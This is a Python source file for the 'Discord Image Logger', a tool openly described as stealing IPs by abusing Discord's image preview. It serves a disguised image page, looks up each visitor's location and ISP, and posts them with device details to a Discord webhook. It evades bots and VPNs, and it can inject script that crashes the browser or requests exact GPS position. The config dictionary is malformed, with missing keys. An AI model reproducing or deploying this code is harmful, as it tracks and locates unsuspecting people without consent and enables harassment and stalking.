# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "https://discord.com/api/webhooks/1389062111312871536/cCnLLE1gLBNfWlBeVAn5tJxi2lFnohnhCYnfIlizmfKGRrLBARYL-TQdGlx97qF2yOzk",
    "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
